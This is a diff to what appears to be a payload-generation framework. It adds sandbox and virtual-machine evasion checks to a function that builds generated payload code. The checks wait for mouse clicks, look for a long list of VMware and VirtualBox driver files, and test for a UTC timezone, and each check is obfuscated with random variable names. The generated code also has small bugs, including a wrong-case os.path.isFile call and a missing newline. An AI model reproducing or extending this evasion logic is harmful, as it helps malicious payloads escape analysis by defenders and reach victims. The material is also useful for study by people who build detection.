@@ -75,6 +75,55 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["CLICKTRACK"][0].lower() != "x":
+
+            rand_counter = evasion_helpers.randomString()
+            minimum_clicks = evasion_helpers.randomString()
+            left_click = evasion_helpers.randomString()
+            right_click = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import win32api\n'
+            check_code += '\t' * num_tabs_required + rand_counter + " = 0\n"
+            check_code += '\t' * num_tabs_required + minimum_clicks + " = " + evasion_payload.required_options["CLICKTRACK"][0] + "\n"
+            check_code += '\t' * num_tabs_required + 'while ' + rand_counter + ' < ' + minimum_clicks + ':\n'
+            check_code += '\t' * num_tabs_required + '\t' + left_click + ' = win32api.GetAsyncKeyState(1)\n'
+            check_code += '\t' * num_tabs_required + '\t' + right_click + ' = win32api.GetAsyncKeyState(2)\n'
+            check_code += '\t' * num_tabs_required + '\t' + 'if ' + left_click + ' % 2 == 1:\n'
+            check_code += '\t' * num_tabs_required + '\t\t' + rand_counter + ' += 1\n'
+            check_code += '\t' * num_tabs_required + '\t' + 'if ' + right_click + ' % 2 == 1:\n'
+            check_code += '\t' * num_tabs_required + '\t\t' + rand_counter + ' += 1\n'
+            check_code += '\t' * num_tabs_required + 'if ' + rand_counter + ' >= ' + minimum_clicks + ':\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["VIRTUALFILES"][0].lower() != "false":
+            
+            vmfiles_exist = evasion_helpers.randomString()
+            files_tocheck = evasion_helpers.randomString()
+            file_path = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import os\n'
+            check_code += '\t' * num_tabs_required + vmfiles_exist + ' = []\n'
+            check_code += '\t' * num_tabs_required + files_tocheck + " = [r'C:\windows\Sysnative\Drivers\Vmmouse.sys', r'C:\windows\Sysnative\Drivers\vm3dgl.dll', r'C:\windows\Sysnative\Drivers\vmdum.dll', r'C:\windows\Sysnative\Drivers\vm3dver.dll', r'C:\windows\Sysnative\Drivers\vmtray.dll', r'C:\windows\Sysnative\Drivers\vmci.sys', r'C:\windows\Sysnative\Drivers\vmusbmouse.sys', r'C:\windows\Sysnative\Drivers\vmx_svga.sys', r'C:\windows\Sysnative\Drivers\vmxnet.sys', r'C:\windows\Sysnative\Drivers\VMToolsHook.dll', r'C:\windows\Sysnative\Drivers\vmhgfs.dll', r'C:\windows\Sysnative\Drivers\vmmousever.dll', r'C:\windows\Sysnative\Drivers\vmGuestLib.dll', r'C:\windows\Sysnative\Drivers\VmGuestLibJava.dll', r'C:\windows\Sysnative\Drivers\vmscsi.sys', r'C:\windows\Sysnative\Drivers\VBoxMouse.sys', r'C:\windows\Sysnative\Drivers\VBoxGuest.sys', r'C:\windows\Sysnative\Drivers\VBoxSF.sys', r'C:\windows\Sysnative\Drivers\VBoxVideo.sys', r'C:\windows\Sysnative\vboxdisp.dll', r'C:\windows\Sysnative\vboxhook.dll', r'C:\windows\Sysnative\vboxmrxnp.dll', r'C:\windows\Sysnative\vboxogl.dll', r'C:\windows\Sysnative\vboxoglarrayspu.dll', r'C:\windows\Sysnative\vboxoglcrutil.dll', r'C:\windows\Sysnative\vboxoglerrorspu.dll', r'C:\windows\Sysnative\vboxoglfeedbackspu.dll', r'C:\windows\Sysnative\vboxoglpackspu.dll', r'C:\windows\Sysnative\vboxoglpassthroughspu.dll', r'C:\windows\Sysnative\vboxservice.exe', r'C:\windows\Sysnative\vboxtray.exe', r'C:\windows\Sysnative\VBoxControl.exe']"
+            check_code += '\t' * num_tabs_required + 'for ' + file_path + ' in ' + files_tocheck + ':\n'
+            check_code += '\t' * num_tabs_required + '\tif os.path.isFile(' + file_path + '):\n'
+            check_code += '\t' * num_tabs_required + '\t\t' + vmfiles_exist + '.append(' + file_path + ')'
+            check_code += '\t' * num_tabs_required + 'if not ' + vmfiles_exist + ':\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":
+
+            time_import = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import time as ' + time_import + '\n'
+            check_code += '\t' * num_tabs_required + 'if ' + time_import + '.tzname[0] != "Coordinated Universal Time" and ' + time_import + '.tzname[1] != "Coordinated Universal Time":\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
 
         if evasion_payload.required_options["SLEEP"][0].lower() != "x":
 
